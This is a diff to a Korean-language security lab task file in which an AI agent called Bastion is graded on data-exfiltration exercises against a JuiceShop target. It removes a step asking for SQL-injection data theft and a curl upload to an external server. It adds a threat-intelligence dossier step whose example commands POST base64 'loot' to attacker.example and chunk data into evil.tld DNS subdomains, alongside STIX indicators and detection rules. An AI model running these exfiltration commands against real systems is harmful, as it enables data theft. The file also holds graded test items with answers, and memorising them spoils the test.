@@ -73,7 +73,9 @@ steps:
     유출하여 탐지를 회피한다.
   verify:
     type: output_contains
-    expect: Extracted users
+    expect:
+    - Extracted users
+    - csv
     field: stdout
     semantic:
       intent: JuiceShop /api/Users SQLi 로 사용자 데이터 추출 후 CSV 파일(/tmp/exfil_users.csv)
@@ -251,7 +253,9 @@ steps:
     허용하는 경우가 많다. 탐지: 비정상적인 ICMP 패킷 크기와 빈도를 모니터링한다.'
   verify:
     type: output_contains
-    expect: ICMP Tunneling
+    expect:
+    - ICMP Tunneling
+    - ping
     field: stdout
     semantic:
       intent: ICMP 터널링 — ping -p <hex> 로 Echo payload 에 커스텀 데이터 삽입, 방화벽의 TCP/UDP 차단
@@ -673,6 +677,7 @@ steps:
     - Data Exfiltration Report
     - 10.0.0.0
     - 203.0.113.45
+    - report
     field: stdout
     semantic:
       intent: 데이터 유출 리포트 — 유출 경로(HTTP/DNS/ICMP/Cloud)·기법(암호화/스테가노/LowAndSlow)·MITRE
@@ -704,52 +709,197 @@ steps:
   risk_level: low
   bastion_prompt: 데이터 유출 실습 결과를 /tmp/exfiltration_report.txt에 정리해줘
 - order: 99
-  instruction: '[Multi-task] 이번 주 핵심 작업 5개를 한 번에 수행하라.'
-  bastion_prompt: '다음 작업들을 순서대로 수행해줘:
+  instruction: |
+    [복합 시나리오] "백신회사 위협 인텔리전스 분석가 — APT Dossier (Diamond Model + STIX IoC)"
 
-    1) web 서버에서 민감한 데이터가 포함된 파일을 식별하라. /etc, /home, /var/www에서 설정 파일과 데이터 파일을 검색해줘
+    ## 상황 — 신규 캠페인 발견, 분석 dossier 작성
 
-    2) JuiceShop에서 SQL Injection을 통해 사용자 데이터를 추출하고, 결과를 파일로 저장해줘
+    당신은 *Vaccino* (가상 백신회사) 위협 인텔리전스 분석가 (CTI Lead 7년차). 협력사 SOC 가
+    이번 주 *비정상 데이터 유출 패턴* 5건 신고. 당신 임무: 3일 내 *Diamond Model* 기반 dossier
+    + STIX 2.1 IoC bundle 작성. 결과물은 ISAC 동맹 (FS-ISAC) 에 공유.
 
-    3) 추출한 데이터를 Base64로 인코딩하여 전송 준비를 해줘
+    > [협력사 SOC head] "DNS 쿼리 길이가 평소 평균 50바이트인데 어제 새벽 200~250바이트 패턴 폭증.
+    > Suricata 시그니처는 안 떠. 누군지·뭘 가져갔는지·다음에 뭐 올지 분석 부탁."
 
-    4) HTTP POST 요청을 통한 데이터 유출을 시뮬레이션하라. curl로 인코딩된 데이터를 외부 서버에 전송하는 방법을 시연해줘
+    학습 목표 (lecture #2 SUID/sudo + #5 커널 CVE) + (lab #1·#2·#5·#7·#9 식별/SQLi exfil/DNS/암호화/스테가) 통합.
 
-    5) DNS 터널링을 통한 데이터 유출의 원리를 이해해줘'
-  hint: 복합 작업은 Bastion이 순서대로 계획하고 실행해야 한다
-  category: multi_task
+    ## 산출물 — 3 파트 dossier
+
+    ### Part 1 — Diamond Model 4 vertices (CTI 분석 골격)
+    ```
+    ┌───────────────────────────┐
+    │     Adversary (가해자)     │
+    │  - APT-X (cluster, 추정)  │
+    │  - 동기: 자료 매각 (cyber │
+    │    crime / state aligned) │
+    │  - skill: 중상 (custom    │
+    │    DNS tunnel + AES-256)  │
+    └───────┬───────────────────┘
+            │ uses                   ┌────────────────────────┐
+            ▼                        │  Capability (TTPs)     │
+    ┌───────────────────────────┐    │  - T1048.003 DNS exfil │
+    │  Infrastructure           │    │  - T1027 obfuscated    │
+    │  - C2: ns1.evil.tld       │◄──►│    files (base64+AES)  │
+    │  - relay: pastebin clone  │    │  - T1029 scheduled     │
+    │  - DGA TLD: .info, .top   │    │    transfer (low-slow) │
+    └───────┬───────────────────┘    │  - T1071.004 DNS C2    │
+            │ targets                │  - T1001.002 stego     │
+            ▼                        └────────────────────────┘
+    ┌───────────────────────────┐
+    │  Victim                   │
+    │  - 부문: 금융권 핀테크    │
+    │  - 자산: 사용자 DB        │
+    │  - 영향: 5,000명 PII      │
+    └───────────────────────────┘
+    ```
+
+    ### Part 2 — 5 exfil 기법 PoC (각 기법 명령 + 트래픽 특성)
+    1) HTTP POST + base64 (T1041, lab #2·#3·#4):
+       `echo "user1:hash1,user2:hash2" | base64 -w0 > /tmp/loot.b64; wc -c /tmp/loot.b64`
+       `echo "[POC] curl -X POST -d @/tmp/loot.b64 https://attacker.example/upload (실 전송 X)"`
+
+    2) DNS 터널 (T1048.003, lab #5):
+       `python3 -c "import base64; data=open('/tmp/loot.b64').read().strip(); ch=[data[i:i+50] for i in range(0,min(len(data),200),50)]; [print(c+'.evil.tld') for c in ch[:4]]"`
+       특성: subdomain 길이 50바이트 x 4 청크 = 200+바이트 (정상 50바이트 평균의 4배).
+
+    3) AES-256 암호화 (T1027, lab #7):
+       `echo "secret-token" | openssl enc -aes-256-cbc -pbkdf2 -pass pass:DEMO123 -base64 2>/dev/null | head -3`
+
+    4) Low-and-Slow 청크 (T1029, lab #8):
+       `for i in 1 2 3; do echo "chunk $i sent at $(date +%H:%M:%S) (실제 전송 X, 5분 간격 모의)"; done`
+
+    5) Stego (T1001.002, lab #9):
+       `echo "[POC] echo SECRET | steghide embed -cf /tmp/cover.jpg -ef -p DEMO -sf /tmp/out.jpg (실 실행 X)"`
+       특성: 이미지 파일 size 차이 5KB 미만 (육안 식별 불가).
+
+    ### Part 3 — STIX 2.1 IoC bundle (4 indicator 출력)
+    `cat <<'EOF'
+    {
+      "type": "bundle",
+      "id": "bundle--apt-x-2026-04-29",
+      "objects": [
+        {
+          "type": "indicator",
+          "id": "indicator--apt-x-dns-1",
+          "pattern": "[domain-name:value MATCHES '^[a-zA-Z0-9+/=]{40,}\\.evil\\.tld$']",
+          "pattern_type": "stix",
+          "valid_from": "2026-04-29T00:00:00Z",
+          "labels": ["malicious-activity"],
+          "name": "APT-X DNS exfil long subdomain"
+        },
+        {
+          "type": "indicator",
+          "id": "indicator--apt-x-c2-2",
+          "pattern": "[network-traffic:dst_ref.value = '169.254.169.254' OR ipv4-addr:value = '203.0.113.99']",
+          "pattern_type": "stix",
+          "valid_from": "2026-04-29T00:00:00Z",
+          "labels": ["malicious-activity"],
+          "name": "APT-X C2 IP / metadata abuse"
+        },
+        {
+          "type": "indicator",
+          "id": "indicator--apt-x-stego-3",
+          "pattern": "[file:hashes.'SHA-256' = 'b5e3...stego-template-hash']",
+          "pattern_type": "stix",
+          "valid_from": "2026-04-29T00:00:00Z",
+          "labels": ["malicious-activity"],
+          "name": "APT-X stego JPEG template"
+        },
+        {
+          "type": "indicator",
+          "id": "indicator--apt-x-aes-4",
+          "pattern": "[file:content_ref.payload_bin MATCHES 'Salted__']",
+          "pattern_type": "stix",
+          "valid_from": "2026-04-29T00:00:00Z",
+          "labels": ["malicious-activity"],
+          "name": "OpenSSL AES-256 magic header"
+        }
+      ]
+    }
+    EOF`
+
+    ### Part 4 — ISAC 공유 권고 (3 항목)
+    1. DNS 쿼리 길이 임계치 100바이트 → Wazuh 룰 100500 작성 (60일 hot 보존)
+    2. egress :443 to non-CDN-list → flow-rate alert (>10MB/min)
+    3. JPEG/PNG 업로드 metadata stripping (DLP CT-INSPECT 룰)
+
+    종료: echo "=== APT-X Dossier (Diamond + IoC) ===" + Diamond Model + 5 PoC + STIX bundle + 권고.
+  bastion_prompt: |
+    [위협 인텔 분석가 — w11 APT Dossier]
+
+    Diamond Model + 5 exfil PoC + STIX 2.1 IoC bundle + ISAC 권고 4 파트.
+
+    Part 1 — Diamond Model (ASCII box):
+    Adversary (APT-X cluster) / Capability (T1048.003 DNS, T1027, T1029, T1071.004, T1001.002) /
+    Infrastructure (ns1.evil.tld, pastebin clone, .info/.top DGA) / Victim (금융권 핀테크 5,000 PII).
+
+    Part 2 — 5 PoC (각 기법 + 트래픽 특성):
+    `echo "user1:hash1,user2:hash2" | base64 -w0 > /tmp/loot.b64; wc -c /tmp/loot.b64`
+    `python3 -c "import base64; data=open('/tmp/loot.b64').read().strip(); ch=[data[i:i+50] for i in range(0,min(len(data),200),50)]; [print(c+'.evil.tld') for c in ch[:4]]"`
+    `echo "secret-token" | openssl enc -aes-256-cbc -pbkdf2 -pass pass:DEMO123 -base64 2>/dev/null | head -3`
+    `for i in 1 2 3; do echo "chunk $i sent at $(date +%H:%M:%S) (실 전송 X)"; done`
+    `echo "[POC] steghide embed -cf cover.jpg -ef secret -p DEMO -sf out.jpg (실 실행 X)"`
+
+    Part 3 — STIX 2.1 bundle (4 indicator):
+    `cat <<'EOF'
+    {
+      "type": "bundle",
+      "id": "bundle--apt-x-2026-04-29",
+      "objects": [
+        {"type":"indicator","id":"indicator--apt-x-dns-1","pattern":"[domain-name:value MATCHES '^[a-zA-Z0-9+/=]{40,}\\.evil\\.tld$']","pattern_type":"stix","valid_from":"2026-04-29T00:00:00Z","labels":["malicious-activity"],"name":"APT-X DNS exfil"},
+        {"type":"indicator","id":"indicator--apt-x-c2-2","pattern":"[ipv4-addr:value = '203.0.113.99']","pattern_type":"stix","valid_from":"2026-04-29T00:00:00Z","labels":["malicious-activity"],"name":"APT-X C2 IP"},
+        {"type":"indicator","id":"indicator--apt-x-stego-3","pattern":"[file:hashes.'SHA-256' = 'b5e3...']","pattern_type":"stix","valid_from":"2026-04-29T00:00:00Z","labels":["malicious-activity"],"name":"APT-X stego template"},
+        {"type":"indicator","id":"indicator--apt-x-aes-4","pattern":"[file:content_ref.payload_bin MATCHES 'Salted__']","pattern_type":"stix","valid_from":"2026-04-29T00:00:00Z","labels":["malicious-activity"],"name":"OpenSSL AES magic"}
+      ]
+    }
+    EOF`
+
+    Part 4 — ISAC 권고 3:
+    1. DNS 쿼리 길이 100바이트 → Wazuh 룰 100500
+    2. egress :443 non-CDN flow-rate >10MB/min alert
+    3. JPEG/PNG metadata stripping DLP CT-INSPECT
+
+    종료: echo "=== APT-X Dossier ===" + 4 파트 모두 출력.
+
+    반드시 4 파트 (Diamond / 5 PoC / STIX / 권고) 모두 출력. 중간 종료 금지.
+    실 전송 X — POC 텍스트만.
+  hint: |
+    Part 1 Diamond 4 vertices ASCII box.
+    Part 2 5 exfil 기법 (HTTP/DNS/AES/Low-Slow/Stego) ATT&CK 매핑 + PoC.
+    Part 3 STIX 2.1 bundle (4 indicator JSON 양식).
+    Part 4 ISAC 권고 3 (Wazuh 룰 / egress flow-rate / DLP).
+    포인트: CTI 분석가 dossier — Diamond + STIX 양식. 보고서 X.
+  category: integration_scenario
   points: 50
   verify:
     type: output_contains
-    expect: ''
+    expect: Dossier
     field: stdout
     semantic:
-      intent: '[통합] 데이터 유출 5작업 — archive/encrypt/DNS/HTTPS/audit 통합. T1041 + T1048.003.'
+      intent: |
+        백신회사 위협 인텔리전스 분석가 — APT-X 캠페인 dossier:
+        Diamond Model 4 vertices + 5 exfil PoC + STIX 2.1 bundle 4 indicator + ISAC 권고 3.
+        lecture w11 + lab #1·#2·#5·#7·#9 동시 행동 증명. *CTI dossier* 산출물.
       success_criteria:
-      - 5 유출 작업
-      - 암호화 exfil
-      - 채널 다양
+      - Part 1 — Diamond Model 4 vertices (Adversary/Capability/Infra/Victim)
+      - Part 2 — 5 exfil PoC + ATT&CK ID + 트래픽 특성
+      - Part 3 — STIX 2.1 bundle 4 indicator (JSON pattern)
+      - Part 4 — ISAC 공유 권고 3
       acceptable_methods:
-      - bastion plan
-      - DNS exfil
-      - HTTPS POST
+      - heredoc Diamond ASCII / STIX JSON
+      - base64 / openssl / python3 PoC
+      - 실 전송 X (POC 텍스트)
+      - markdown / ASCII art
       negative_signs:
-      - 평문 exfil
-      - 단일 채널
-      - audit 누락
+      - Diamond Model 누락
+      - STIX JSON 형식 X
+      - exfil 3 기법 이하
+      - ISAC 권고 누락
+      - 매트릭스/슬라이드/walkthrough 형식
   target_vm: attacker
   risk_level: low
-  answer: '🤖 프롬프트: 다음 작업들을 순서대로 수행해줘:
-
-    1) web 서버에서 민감한 데이터가 포함된 파일을 식별하라. /etc, /home, /var/www에서 설정 파일과 데이터 파일을 검색해줘
-
-    2) JuiceShop에서 SQL Injection을 통해 사용자 데이터를 추출하고, 결과를 파일로 저장해줘
-
-    3) 추출한 데이터를 Base64로 인코딩하여 전송 준비를 해줘
-
-    4) HTTP POST 요청을 통한 데이터 유출을 시뮬레이션하라. curl로 인코딩된 데이터를 외부 서버에 전송하는 방법을 시연해줘
-
-    5) DNS 터널링을 통한 데이터 유출의 원리를 이해해줘'
-  answer_detail: Bastion이 5개 작업을 순차적으로 계획(planning)하고 실행(executing)한 뒤 종합 분석(validating)하는
-    다단계 작업.
+  answer: |
+    🤖 위 bastion_prompt 그대로. Diamond + 5 PoC + STIX bundle + 권고.
+  answer_detail: |
+    위협 인텔 분석가 dossier — Diamond Model + STIX 2.1 정식 양식. ISAC 공유용. 실 전송 X.
   script: ''
